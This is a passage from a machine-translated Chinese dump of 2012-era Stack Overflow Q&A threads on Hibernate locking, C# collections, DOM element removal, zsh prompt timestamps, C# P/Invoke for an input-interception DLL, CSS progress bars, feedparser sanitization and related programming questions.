                .createQuery("from Account where status = :finalStatus")
                .setLockMode("MappCurrentRequests", LockMode.PESSIMISTIC_READ)
                .setParameter("finalStatus","Active").list(); 
```

目前，我在整个表上都使用了 Pessimistic_read。有没有办法可以申请锁定个别行？任何示例都会非常有帮助。

谢谢你，甘达富

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T22:55:01.730

锁定类型由数据库本身隐含。

如果您使用的是 MyISAM 存储引擎，那么无论您多么努力——无论是在原始 SQL 中还是在 JDBC 中，都无法强制行级锁定。MyISAM 根本不支持行级锁。

只需切换到使用 InnoDB，您甚至无需调用`setLockMode`即可获得必要的锁定类型。

从[手册](https://dev.mysql.com/doc/refman/5.5/en/internal-locking.html)：

> MySQL 对 InnoDB 表使用行级锁定，以支持多个会话同时写入访问，使其适用于多用户、高并发和 OLTP 应用程序。MySQL 对 MyISAM、MEMORY 和 MERGE 表使用表级锁定，一次只允许一个会话更新这些表，使其更适合只读、多读或单用户应用程序。

# c# - 存储这些值的最轻量级集合是什么？

> ID：13125814
> 
> 赞同：3
> 
> 时间：2012-10-29T16:34:03.040
> 
> 标签：c#, .net

我有很多对象（例如 10.000，或多或少）。每个对象都有 3 个值：

1.  索引（十进制，如0,0 <= X <= 100.000,9）；
2.  纬度值；
3.  经度值；

由于索引值，我需要执行一些搜索。这将是轻松的方法？`List<MyObject>`? 我知道有哈希表，但仅适用于 2 个值...

我从 .csv 文件中读取这些值，并将其存储在应用程序中。网络表单，.NET 4.5。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:37:02.823

就内存使用而言，最简单的方法是将它们放入一个结构中，并将它们保存在此类结构的数组中。根据您的说法，您无法真正将数据打包得更紧：两个双精度和一个小数将占用每个条目 32 个字节，并且结构数组不会在此之上添加任何每个项目的开销。

话虽如此，这会减慢您的编码速度，并且在实践中可能节省的时间太少。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T17:18:32.947

你为什么不使用这样的字典：

```
public class Position
{
    public Latitude  Latitude  { get ; set ; }
    public Longitude Longitude { get ; set ; }
}

public Dictionary<decimal,Position> Positions ; 
```

或者使用字典中的元组：

```
public Dictionary<decimal,Tuple<Latitude,Longitude>> Positions ; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:37:46.410

我相信绝对最轻的方法是将您的值位掩码为无符号长整数，尽管它有点麻烦。

为了真正掌握哪种方法最有效，我建议使用测试值尝试所有方法并查看 sizeof() 的输出。这样你就可以确定它们的运行时内存大小是多少。

我建议使用自定义结构来保存您的值，元组也可以工作。

# java - 检查方法是否返回任何值类型 int

> ID：13125815
> 
> 赞同：1
> 
> 时间：2012-10-29T16:34:05.183
> 
> 标签：java

我有返回 int 值的方法，我想检查该方法是否返回任何值，我该怎么做？

我试图用大于做下面的事情，但我不确定这是正确的方法，因为我正在检查具体`> 0`但不是该方法是否返回任何值。

```
if (Type.FixedLength() > 0)  {

    //do something...

} 
```

此致

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-29T16:35:48.567

An`int`是一种原始数据类型，因此该函数必须返回 an `int`，它不能返回`null`，因此将始终返回一个“值”。

返回非结果或错误条件的标准方法是使用远远超出预期结果的典型范围的东西，例如`Integer.MIN_VALUE`预期结果为正时。

还建议仅以`class`大写字母开头名称，因此您的函数的更好名称是`Type.fixedLength()`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-29T16:37:05.333

返回 an 的方法`int`将始终返回一个值，否则将无法编译。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T18:16:47.090

如果您的方法之前有一个数据类型，这意味着它将始终返回一个值，在这种情况下为 int。但是，由于您的问题是要检查返回的值，因此您可以使用：

```
System.out.printf("Returned value is: %d", Type.fixedLength()); 
```

这是一种以任何方式查看返回值的方法。

希望能帮助到你

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:49:28.073

一个方法可以做三件基本的事情：返回、抛出异常或阻塞程序。具有声明返回类型的方法总是返回该类型的值。因此，如果您的代码编译并且您的程序没有异常退出，则该方法将返回一个值。

有两种简单的方法可以确定方法是否返回预期值。

1.  将值存储在变量中，并在 if 语句之前将该变量打印到控制台。像这样：

    int fixedLength = Type.FiixedLength(); System.out.println(fixedLength); if(fixedLength > 0){ //代码 }

2.  使用调试器。

# javascript - 如何删除使用 querySelectorAll 获取的元素？

> ID：13125817
> 
> 赞同：74
> 
> 时间：2012-10-29T16:34:14.650
> 
> 标签：javascript, element, selectors-api

这似乎可以快速回答，但我找不到。也许我在搜索错误的术语？请不要使用库，尽管我不需要跨浏览器后备，但我的目标是该项目的所有最新版本。

我得到了一些元素：

```
element = document.querySelectorAll(".someselector"); 
```

这是有效的，但我现在如何删除这些元素？我是否必须遍历它们并执行此操作`element.parentNode.removeChild(element);`，还是缺少一个简单的功能？

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2012-10-29T16:35:43.167

是的，你几乎是对的。`.querySelectorAll`返回一个*冻结的 NodeList*。你需要迭代它并做一些事情。

```
Array.prototype.forEach.call( element, function( node ) {
    node.parentNode.removeChild( node );
}); 
```

即使你只有一个结果，你也需要通过索引来访问它，比如

```
elements[0].parentNode.removeChild(elements[0]); 
```

* * *

如果您*只想*查询一个元素，请`.querySelector`改用。在那里，您只需获取*节点引用*，而无需使用索引进行访问。

* * *

## 回答 #2

> 赞同：62
> 
> 时间：2017-09-26T11:11:14.127

由于`NodeList`已经支持`forEach`您可以使用：

```
document.querySelectorAll(".someselector").forEach(e => e.remove());
```

```
<div>
  <span class="someselector">element 1</span>
  <span class="someselector">element 2</span>
  there shouldn't be any of the above "element" spans after you run the code
</div>
```

请参阅[NodeList.prototype.forEach()](https://developer.mozilla.org/en-US/docs/Web/API/NodeList/forEach)和[Element.remove()](https://developer.mozilla.org/en-US/docs/Web/API/Element/remove)

**Internet Explorer 支持**。IE 不支持`forEach`on the`NodeList`并且 IE 也不支持对象`remove`上的方法`Element`。因此，如果您还希望在 IE 中运行上述代码，只需在 JavaScript 代码的开头添加以下行，并使用[Node.removeChild](https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild)删除元素（或*使用[Element.remove()](https://developer.mozilla.org/en-US/docs/Web/API/Element/remove) polyfill* ):

```
if (!NodeList.prototype.forEach && Array.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
}
// ..then continue as usual with the forEach
document.querySelectorAll(".someselector").forEach(e => e.parentNode.removeChild(e));
```

```
<div>
  <span class="someselector">element 1</span>
  <span class="someselector">element 2</span>
  Should be empty
</div>
```

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2019-01-24T09:20:49.643

[使用Array.from](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/from)和[ChildNode.remove](https://developer.mozilla.org/en-US/docs/Web/API/ChildNode/remove)更加简洁：

```
Array.from(document.querySelectorAll('.someselector')).forEach(el => el.remove()); 
```

好的，刚刚看到 NodeList 是可迭代的，所以它可以做得更短：

```
document.querySelectorAll('.someselector').forEach(el => el.remove()); 
```

# c# - 如何使用套接字（状态对象）

> ID：13125822
> 
> 赞同：0
> 
> 时间：2012-10-29T16:34:34.900
> 
> 标签：c#, sockets, asynchronous

我正在学习套接字，以及如何为服务器和客户端创建代码。

（顺便说一句，我正在做异步服务器和客户端套接字）。

我不太明白的是，当一个新的客户端连接到服务器时，我创建了一个新的 StateObject。这是一个包含一些字段的自定义类，例如实际的 Socket 和缓冲区（指定长度的字节 []）。

*   那么，只要客户端已连接，我是否必须继续跟踪状态对象的此实例，或者我不需要？

*   接收完成后 Socket 是否被 Shutdown 和 Closed（这是两种方法）？

*   如何创建所有客户的列表？我是否必须创建这些状态对象的集合？

--

我问是因为我并不真正了解异步套接字的真正工作，即使我花了几天时间。

如果我确实创建了这些状态对象的列表，并且在 foreach 循环中尝试将数据发送给每个对象（实际上是一个接一个），那么令人困惑的是（实际上仍然如此），它只是没有发送.

--

添加：

通过创建一个 T 将是 Socket 类的 List 来跟踪所有客户端是否足够？状态对象呢？是否仅在传递数据时使用：

*   在服务器端（当新数据到达时）；

*   在客户端（当新数据到达时）。

提前谢谢你的答案。

米贾

# javascript - 嵌套 JSF 表达式语言和 JavaScript

> ID：13125823
> 
> 赞同：2
> 
> 时间：2012-10-29T16:34:37.457
> 
> 标签：javascript, jsf, onclick, el, nested

我可能对 JSF 表达式语言与 javaScript 的关系有错误的想法。我想做的是在JSF EL中的js中嵌套一点JSF EL。应该是这样的：

```
<h:commandLink onclick="#{ condition ? 'jsFunction('#{bean.property}delimiter#{bean.prop2}')' :''}" action="... 
```

显然这不起作用，那么如何在 JSF EL 中的 js 中嵌套一点 JSF EL？

ps.：我知道我可以创建两个命令链接并将条件移动到“渲染”属性中，但我想了解这个连词的关系。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:41:32.303

您不能嵌套 EL 表达式，也不能在 EL 表达式中连接字符串。`}`通过使用而不是关闭函数调用，您还会遇到 JS 语法错误`)`。

预先准备嵌套表达式，`<c:set>`其中您可以在结果字符串值中内联所需的表达式：

```
<c:set var="jsFunction" value="jsFunction('#{bean.property}delimiter#{bean.prop2}')" /> 
```

这样您就可以按如下方式打印它：

```
<h:commandLink ... onclick="#{condition ? jsFunction : ''}" /> 
```

# zsh - zsh：命令启动时使用当前时间更新提示

> ID：13125825
> 
> 赞同：40
> 
> 时间：2012-10-29T16:34:41.170
> 
> 标签：zsh, prompt, zsh-zle

我有一个`zsh`我比较喜欢的提示：它评估当前时间`precmd`并在提示的右侧显示：

```
[Floatie:~] ^_^ 
cbowns%                      [9:28:31 on 2012-10-29] 
```

然而，这并不是我想要的：*正如*你在下面看到的，这个时间实际上是上一个命令退出的时间，而不是命令启动的时间：

```
[Floatie:~] ^_^ 
cbowns% date                           [9:28:26 on 2012-10-29]
Mon Oct 29 09:28:31 PDT 2012
[Floatie:~] ^_^ 
cbowns% date                           [9:28:31 on 2012-10-29]
Mon Oct 29 09:28:37 PDT 2012
[Floatie:~] ^_^ 
cbowns%                                [9:28:37 on 2012-10-29] 
```

在 shell 启动新命令*之前*是否有一个`zsh`运行命令的钩子，以便我可以更新提示时间戳？（我[在 zsh 提示符中看到了不断更新的时钟？](https://stackoverflow.com/questions/2187829/constantly-updated-clock-in-zsh-prompt)，但我不需要它*不断*更新，只是在我按回车时更新。）

 **（`^_^`基于上一个命令的返回码。`;_;`当存在非零退出状态时，它显示为红色。）

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2013-07-29T02:27:17.927

这实际上是可能的，无需借助奇怪的技巧。我的 .zshrc 中有这个

```
RPROMPT='[%D{%L:%M:%S %p}]'

TMOUT=1

TRAPALRM() {
    zle reset-prompt
} 
```

TRAPALRM 函数每 TMOUT 秒调用一次（在本例中为 1），在这里它执行提示刷新，并一直执行到命令开始执行（并且它不会干扰您在按 Enter 之前在提示上键入的任何内容）。我知道您不需要不断刷新它，但它仍然可以完成工作，而无需自己排队！

资料来源：[http](http://www.zsh.org/mla/users/2007/msg00944.html) ://www.zsh.org/mla/users/2007/msg00944.html （从 2007 年开始！）

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2014-10-27T10:44:37.660

我很难做到这一点：

它在右侧显示命令执行的日期。它不会覆盖显示的命令。警告：它可能会覆盖当前的 RPROMPT。

```
strlen () {
    FOO=$1
    local zero='%([BSUbfksu]|([FB]|){*})'
    LEN=${#${(S%%)FOO//$~zero/}}
    echo $LEN
}

# show right prompt with date ONLY when command is executed
preexec () {
    DATE=$( date +"[%H:%M:%S]" )
    local len_right=$( strlen "$DATE" )
    len_right=$(( $len_right+1 ))
    local right_start=$(($COLUMNS - $len_right))

    local len_cmd=$( strlen "$@" )
    local len_prompt=$(strlen "$PROMPT" )
    local len_left=$(($len_cmd+$len_prompt))

    RDATE="\033[${right_start}C ${DATE}"

    if [ $len_left -lt $right_start ]; then
        # command does not overwrite right prompt
        # ok to move up one line
        echo -e "\033[1A${RDATE}"
    else
        echo -e "${RDATE}"
    fi

} 
```

资料来源：

*   [http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/x361.html](http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/x361.html)
*   [https://stackoverflow.com/a/10564427/238913](https://stackoverflow.com/a/10564427/238913)

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2012-10-29T17:11:47.877

`zsh``preexec`将在执行一行之前运行该函数。输出当前时间很简单，一个简单的版本就是：

```
preexec() { date } 
```

修改现有提示将更具挑战性。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2015-10-25T09:46:46.513

`Return`您可以在接受该行之前重新映射密钥以重置提示：

```
reset-prompt-and-accept-line() {
    zle reset-prompt
    zle accept-line
}

zle -N reset-prompt-and-accept-line

bindkey '^m' reset-prompt-and-accept-line 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2016-01-28T01:09:16.187

以@vitaŭt-bajaryn 的酷 ZSH 风格[答案](https://stackoverflow.com/a/33328293/751061)为基础：

我认为覆盖 accept-line 函数可能是最惯用的 zsh 解决方案：

```
function _reset-prompt-and-accept-line {
  zle reset-prompt
  zle .accept-line     # Note the . meaning the built-in accept-line.
}
zle -N accept-line _reset-prompt-and-accept-line 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2012-12-29T18:17:56.063

您可以使用[ANSI 转义序列](http://en.wikipedia.org/wiki/ANSI_escape_code)覆盖上一行，如下所示：

```
preexec () {
  DATE=`date +"%H:%M:%S on %Y-%m-%d"`
  C=$(($COLUMNS-24))
  echo -e "\033[1A\033[${C}C ${DATE} "
} 
```**

# java - 使用数据库中的分层数据在 java 中创建树结构

> ID：13125827
> 
> 赞同：1
> 
> 时间：2012-10-29T16:34:55.607
> 
> 标签：java, mysql, dom, hierarchy

我手头有这个问题，如下所示：

用户和组之间存在多对多关系。后端有各个实体类的表以及一个交集表 User_Groups，它存储有关用户与组的关联信息。组表有两列这与手头的问题有关。组表的结构如下：

* * *

```
Table name - GROUP

CREATE  TABLE IF NOT EXISTS
GROUP
(
  GROUP_ID INT NOT NULL AUTO_INCREMENT ,
  NAME VARCHAR(50) NULL ,
  DESCRIPTION VARCHAR(50) NULL ,
  CREATED_DATE DATE NULL ,
  CREATED_BY VARCHAR(50) NULL ,
  MODIFIED_DATE DATE NULL ,
  MODIFIED_BY VARCHAR(50) NULL ,
  GROUP_TYPE_ID INT NULL ,
  PARENT_GROUP_ID INT NULL ,
  PRIMARY KEY (GROUP_ID) ,
  INDEX fk_groupTypeId_idx (GROUP_TYPE_ID ASC) ,
  CONSTRAINT fk_groupTypeId  FOREIGN KEY (GROUP_TYPE_ID )  
  REFERENCES efc_group_type (GROUP_TYPE_ID )
 ON DELETE NO ACTION
 ON UPDATE NO ACTION);
------------------------------------------------------------------------------------------
Table name - USER_GROUPS

CREATE TABLE IF NOT EXISTS
EFC_USER_GROUPS 
(
  USER_ID int(11) NOT NULL,
  GROUP_ID int(11) NOT NULL,
  CREATED_DATE date DEFAULT NULL,
  PRIMARY KEY (USER_ID,GROUP_ID),
  KEY FK_USERID_idx (USER_ID),
  KEY FK_GROUPID_idx (GROUP_ID),
  CONSTRAINT FK_GROUPID_USERGROUPS FOREIGN KEY (GROUP_ID) 
  REFERENCES efc_group (GROUP_ID),
  CONSTRAINT FK_USERID_USERGROUPS FOREIGN KEY (USER_ID) 
  REFERENCES efc_user (USER_ID)); 
```

* * *

基本上是在`parent_group_id`充当外国专栏`group_id`。一个组可以有子组，因此需要存储`parent_group_Id`. 对于添加的每个子组，我们存储添加子组的`parent_group_id`那个组的 。现在您对数据模型有了一些了解，我将说明我的问题是什么：

我正在尝试为某个用户的组和子组之间的父子关系构建一个树状结构。因此，对应于某个`user Id`，我可以从表中获取他所属的组。然后`user_groups`我可以将组过滤到两个列表中，一个代表父节点，另一个具有所有子节点。现在组之间的层次结构存储在组表中。我无法弄清楚如何在java中实现它。我已经有了这份清单，但在该清单中，每个组的上面都可以有父母，下面也可以有孩子。我无法理解如何构建从上到下的层次结构。我的唯一目的是将构成父节点的 XML 构建到最后一个子节点并将其发送到前端。

PS：我已经用谷歌搜索了很多。我没有想法:(。请帮助我

# c# - 导入：在 C# 下使用 C++ 库的语法翻译

> ID：13125829
> 
> 赞同：0
> 
> 时间：2012-10-29T16:35:05.763
> 
> 标签：c#, c++, dll

目前我正在尝试使用 DLL 导入在 C# 下使用 C++ 库。库被称为拦截。问题是我不知道如何翻译头文件的#define 条目和 typedef 声明：

[https://github.com/oblitum/Interception/blob/master/include/interception.h](https://github.com/oblitum/Interception/blob/master/include/interception.h)

我尝试使用“使用”指令，但没有成功（我无法访问 void 定义）。此外，我没有理解 __declspec(dllimport) 在这个头文件中的作用。在我的 c# 项目中，我只是忽略了它？这样做好吗？

这是我想在 c# 中使用的代码（它是库的示例）

[https://github.com/oblitum/Interception/blob/master/samples/hardwareid/main.cpp](https://github.com/oblitum/Interception/blob/master/samples/hardwareid/main.cpp)

编辑：

我试过的：基本进口：

```
[DllImport("interception.dll", CharSet = CharSet.Auto, SetLastError = true)]
    void interception_set_filter(void* context, InterceptionPredicate predicate, ushort filter); 
```

我不知道如何转换 InterceptionPredicate。根据头文件，InterceptionFilter是一个ushort，InterceptionContext是一个void指针（void*）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:45:51.700

C++ 库应编译为 .DLL 文件。这个 .DLL 文件应该有导出的函数。您可以使用[Depends](http://www.dependencywalker.com/)工具检查从 .DLL 导出的内容。.NET 代码可以使用所谓的“平台调用”调用 C++ 导出函数。

现在，我强烈建议您深入了解本[平台调用教程](http://msdn.microsoft.com/en-us/library/aa288468%28v=vs.71%29.aspx)，它将为您提供指导。

PS：`void *`应该在c#中声明为IntPtr。`enums`应该重新声明为枚举。函数应声明为带有`DllImport`属性的静态外部方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T17:48:39.033

首先，看起来您正在尝试实现全局键盘/鼠标挂钩..如果是这种情况，我建议您使用谷歌搜索“C# 低级键盘和鼠标挂钩”。

现在对于您的问题，首先是`__declspec(dllimport)`问题：如果您实际上是在 C++ 应用程序中使用标头，那是 C# 的 C++ 等价物`DllImport`.. 所以实际上您并没有忽略它，而是实现了它。在 C++ 中，它只是告诉链接器声明的函数将从特定的 DLL 导入，而不是本地函数（与 C#`DllImport`指令的作用非常相似）

接下来是函数指针问题（InterceptionPredicate）。在标题中，它被定义为：

```
typedef int (*InterceptionPredicate)(InterceptionDevice device); 
```

并且`InterceptionDevice`只是一个'int'。所以 InterceptionPredicate 只是一个函数指针类型（或 C# 中的 Delegate），所以 InterceptionPredicate 的委托定义如下所示：

```
// [UnmanagedFunctionPointer(CallingConvention.Winapi)]
public delegate int InterceptionPredicate (int device); 
```

关于 UnmanagedFunctionPointer 调用约定描述符的注释：如果您知道导出的函数可能使用哪种调用约定（stdcall、fastcall、cdecl），您可以在此处指定，以便 .NET 封送拆收器知道如何在托管/非托管代码，但如果您不知道它或通常未指定它，您可以将其关闭。

此外，正如其他人所提到的，除非您在 C# 属性中指定了“不安全”标志，否则`void*`类型应该始终是`IntPtr`C# 中的。

此外，请务必将 C# 代码中的 dll 函数标记为`public static extern`，请参见下面的示例。

因此，为了举例说明您指定的函数，可以执行以下操作：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace InterceptorTest
{
    public class Interceptor : IDisposable
    {
        #region DllImports

        [DllImport("interception.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr interception_create_context();

        [DllImport("interception.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern void interception_destroy_context(IntPtr context);

        [DllImport("interception.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern void interception_set_filter(IntPtr context, InterceptionPredicate predicate, ushort filter);

        // The function pointer type as defined in interception.h that needs to be defined as a delegate here
        public delegate int InterceptionPredicate(int device);

        #endregion

        #region private members

        private InterceptionPredicate m_PredicateDelegate { get; set; }
        private IntPtr m_Context { get; set; }

        #endregion

        #region methods

        public Interceptor(ushort filter)
        {
            // be sure to initialize the context
            this.m_PredicateDelegate = new InterceptionPredicate(this.DoSomethingWithInterceptionPredicate);
            this.m_Context = interception_create_context();
            interception_set_filter(this.m_Context, this.m_PredicateDelegate, filter);
        }

        private void Cleanup()
        {
            interception_destroy_context(this.m_Context);
            // the next line is not really needed but since we are dealing with
            // managed to unmanaged code it's typically best to set to 0
            this.m_Context = IntPtr.Zero;
        }

        public void Dispose()
        {
            this.Cleanup();
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing) { this.Cleanup(); }
        }

        public int DoSomethingWithInterceptionPredicate(int device)
        {
            // this function is something you would define that would do something with
            // the device code (or whatever other paramaters your 'DllImport' function might have
            // and return whatever interception_set_filter is expecting
            return device;
        }

        #endregion
    }

    static class Program
    {
        [STAThread]
        private static void Main(string[] argv)
        {
            Interceptor icp = new Interceptor(10);
            // do something with the Interceptor object
        }
    }
} 
```

希望这能让你走上正轨。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-30T14:43:47.057

好的，我找到了隐藏在 GIT 中的示例代码。谢谢谷歌！

[https://gist.github.com/1959219](https://gist.github.com/1959219)

它通过一个工作示例精确地从 DLL 导入中获取所有功能。

# html - 将十进制值显示为 html 框

> ID：13125830
> 
> 赞同：2
> 
> 时间：2012-10-29T16:35:09.270
> 
> 标签：html, css

![将值显示为彩色表示](../Images/a4bc2a7b032fdc0ef49c420ac8780f68.png)

我得到一个 1 到 5 之间的十进制数，我想像上面提到的图像一样表示它。例如，此图像显示了一个值`3.7`

使用它显示它的最佳方式是什么`html + css`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T17:07:29.233

根据您尚未发布的标记，我会选择 2 张背景图片。一个带有红色条，另一个带有所有盒子，中间是透明的。然后，通过一点计算（将您的 1-5 范围映射到百分比或像素），您只需将红色条移动到`background-position`.

当条形图最终位于其中一个不透明区域的后面时，您不会看到任何差异，但这还不错，是吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:51:43.267

您可以使用 UL 和一些 DIV 来做到这一点。

```
<ul>
<li>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
    <div class="on"></div>
</li> 
```

这是一个简单的例子：

[http://jsfiddle.net/EfpPr/5/](http://jsfiddle.net/EfpPr/5/)

显然，您只需要一点 javascript/jQuery 就可以根据需要将 DIV 设置为开/关。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T17:09:38.040

假设您可以将小数转换为百分比，这对于纯 CSS 是可行的。或者，您可以使用一小段 JavaScript 来[设置/调整百分比值](http://jsfiddle.net/GqK6p/4/)。

![在此处输入图像描述](../Images/c836151e8c3a2d5cdafa40fe82c904e1.png)

*IE7+、Chrome 等*

## 示例 1

简单示例，无脚本，最少标记：http: [//jsfiddle.net/GqK6p/6/](http://jsfiddle.net/GqK6p/6/)

**HTML**

```
<div id="progress"></div>
<ul id="mask">
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
</ul> 
```

**CSS**

```
#wrapper { position: relative; height: 30px; width: 180px; }
#progress { position: absolute; top: 0; left: 0; z-index: 0; background-color: red; width: 74%; height: 100%; }
#mask { position: absolute; z-index: 1; height: 100%; }
LI { float: left; border: 4px solid #aaa; height: 22px; width: 22px; } 
```

## 示例 2

一个更精致的例子，允许每个盒子的内部样式：http: [//jsfiddle.net/GqK6p/2/](http://jsfiddle.net/GqK6p/2/)

这也显示了基于百分比的条形宽度的使用。

**HTML**

```
<div id="wrapper">
    <div id="progress"></div>
    <ul id="mask">
        <li><div></div></li>
        <li><div></div></li>
        <li><div></div></li>
        <li><div></div></li>
        <li><div></div></li>
        <li><div></div></li>
    </ul>  
</div> 
```

**CSS**

```
#wrapper { position: relative; height: 30px; width: 180px; }

/* set width to whatever percentage makes sense based on decimal value */

#progress { position: absolute; top: 0; left: 0; z-index: 0; background-color: red; 
    width: 59%; height: 100%; }

#mask { position: absolute; z-index: 1; height: 100%; }
LI { float: left; border: 4px solid #aaa; height: 22px; width: 22px; }
LI > DIV { border: 1px solid #555; height: 20px; } 
```

## 示例 3

这是一个动画变体，展示了如何使用 JavaScript 动态调整进度条的宽度：http: [//jsfiddle.net/GqK6p/4/](http://jsfiddle.net/GqK6p/4/)

```
var progress = $("#progress");
var width = 0; // use whatever starting value makes sense

setInterval(function(){

    // increment/process as desired
    if( ++width > 100 ){
         width = 0;
    }        

    progress.css("width",  width + "%");       
}, 25);​ 
```

## HTML 5 进度元素

作为旁注，HTML 5`progress`元素可能是此类信息的语义选择，但[浏览器支持还不完整](http://www.useragentman.com/blog/2012/01/03/cross-browser-html5-progress-bars-in-depth/)，我认为不存在任何样式的功能`progress`。

# python - feedparser 无法获取 youtube 播放器

> ID：13125833
> 
> 赞同：1
> 
> 时间：2012-10-29T16:35:16.210
> 
> 标签：python, feedparser

我正在测试[`feedparser`](http://code.google.com/p/feedparser/)我的 RSS 提要。它就像一个魅力，我得到了所有的条目。

有些新闻有一个嵌入式 youtube 播放器，但这只是没有出现在 feedparser 的返回值中。

我的代码很简单：

```
d = feedparser.parse('http://feeds.feedburner.com/NotciasPs3evita-Mypst') 
```

这将返回（摘录）：

```
 guidislink': False,
          'id': u'http://mypst.com.br/forum/index.php?/topic/17336-gamegen-call-of-duty-black-ops-2-ganha-trailer-com-acao-real-e-muitas-surpresas/',
          'link': u'http://mypst.com.br/forum/index.php?/topic/17336-gamegen-call-of-duty-black-ops-2-ganha-trailer-com-acao-real-e-muitas-surpresas/',
          'links': [{'href': u'http://mypst.com.br/forum/index.php?/topic/17336-gamegen-call-of-duty-black-ops-2-ganha-trailer-com-acao-real-e-muitas-surpresas/',
                     'rel': u'alternate',
                     'type': u'text/html'}],
          'published': u'Mon, 29 Oct 2012 14:53:58 +0000',
          'published_parsed': time.struct_time(tm_year=2012, tm_mon=10, tm_mday=29, tm_hour=14, tm_min=53, tm_sec=58, tm_wday=0, tm_yday=303, tm_isdst=0),
          'summary': u'A Activision revelou hoje um novo trailer de Call of Duty: Black Ops 2, substituindo as cenas de a\xe7\xe3o do jogo por cenas de a\xe7\xe3o na vida real. O trailer traz diversas \u201csurpresas\u201d e alguns zumbis.<br />\n<br />\n<br />\n<br />\nCall of Duty: Black Ops 2 chegar\xe1 no dia 13 de novembro nos Estados Unidos.<br />\n<br />\n<br />\n<em class="bbc"><strong class="bbc">Fonte: <a class="bbc_url" href="http://www.gamegen.com.br/playstation3/call-of-duty-black-ops-2-ganha-trailer-com-acao-real-e-muitas-surpresas/" rel="nofollow external" title="Link externo">GameGeneration</a></strong></em>',
          'summary_detail': {'base': u'http://feeds.feedburner.com/NotciasPs3evita-Mypst',
                             'language': None,
                             'type': u'text/html',
                             'value': u'A Activision revelou hoje um novo trailer de Call of Duty: Black Ops 2, substituindo as cenas de a\xe7\xe3o do jogo por cenas de a\xe7\xe3o na vida real. O trailer traz diversas \u201csurpresas\u201d e alguns zumbis.<br />\n<br />\n<br />\n<br />\nCall of Duty: Black Ops 2 chegar\xe1 no dia 13 de novembro nos Estados Unidos.<br />\n<br />\n<br />\n<em class="bbc"><strong class="bbc">Fonte: <a class="bbc_url" href="http://www.gamegen.com.br/playstation3/call-of-duty-black-ops-2-ganha-trailer-com-acao-real-e-muitas-surpresas/" rel="nofollow external" title="Link externo">GameGeneration</a></strong></em>'},
          'title': u'[GameGen] Call of Duty: Black Ops 2 ganha trailer com a\xe7\xe3o real e muitas surpresas',
          'title_detail': {'base': u'http://feeds.feedburner.com/NotciasPs3evita-Mypst',
                           'language': None,
                           'type': u'text/plain',
                           'value': u'[GameGen] Call of Duty: Black Ops 2 ganha trailer com a\xe7\xe3o real e muitas surpresas'}}, 
```

除了 youtube 播放器`<object>`标签外，一切都准备就绪。这是 feedparser 错误还是我的 rss 上的问题？python 上还有其他库可以做到这一点吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T17:10:16.677

feedparser会[清理 HTML 输入](http://packages.python.org/feedparser/html-sanitization.html)，默认情况下会去除`<object>`,`<param>`和标签。`<embed>`

您需要禁用清理（仅当您真正信任来源时），或将 YouTube 标签列入白名单。

要禁用清理，请设置`SANITIZE_HTML`为 False：

```
feedparser.SANITIZE_HTML = False 
```

要添加到白名单，请将元素添加到`_HTMLSanitizer.acceptable_elements`集合中：

```
_HTMLSanitizer.acceptable_elements.update(['object', 'param', 'embed']) 
```

这两种方法都有固有的风险，并且您正在以这种方式受到攻击。我使用的方法是完全切换清理，然后使用[其他方法](https://stackoverflow.com/questions/699468/python-html-sanitizer-scrubber-filter)清理 HTML，可能使用`lxml.html.clean`白名单并将 YouTube 列为`host_whitelist`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-20T18:55:49.823

作为对上述解决方案的响应，看起来最近 SANITIZE_HTML 设置已移至 feedparser.api 下：

```
feedparser.api.SANITIZE_HTML = False
feedparser.api.mixin.SANITIZE_HTML = False 
```

# java - Java 配置到 XML 配置 - Spring Social

> ID：13125835
> 
> 赞同：0
> 
> 时间：2012-10-29T16:35:17.603
> 
> 标签：java, xml, spring-mvc, configuration, spring-social

我是 Java Config 的新手，并且正在努力将基于 Java 的配置转换为基于 XML 的配置。任何人都可以指导我进行转换。非常感谢！

```
@Bean
@Scope(value="singleton", proxyMode=ScopedProxyMode.INTERFACES) 
public UsersConnectionRepository usersConnectionRepository(AccountRepository accountRepository) {
